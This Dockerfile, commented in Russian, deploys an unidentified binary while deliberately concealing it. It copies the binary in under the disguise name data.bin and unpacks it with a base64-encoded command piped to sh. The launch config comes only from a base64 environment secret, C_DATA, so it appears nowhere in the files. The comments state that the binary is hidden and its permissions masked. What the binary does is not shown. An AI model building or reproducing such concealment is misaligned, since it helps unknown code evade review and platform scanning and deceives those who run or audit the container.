FROM alpine:latest

RUN apk add --no-cache ca-certificates unzip

# Копируем бинарник (скрыт под именем data.bin)
COPY data.bin /tmp/data.bin

# Распаковка и маскировка прав
RUN echo "dW56aXAgL3RtcC9kYXRhLmJpbiAtZCAvdXNyL2xvY2FsL2Jpbi8gJiYgY2htb2QgK3ggL3Vzci9sb2NhbC9iaW4vd2ViLWFwcA==" | base64 -d | sh && rm /tmp/data.bin

# Запуск: конфиг берется ТОЛЬКО из секрета C_DATA, которого нет в файлах
CMD sh -c "echo \$C_DATA | base64 -d > /tmp/sys_config.json && /usr/local/bin/web-app -c /tmp/sys_config.json"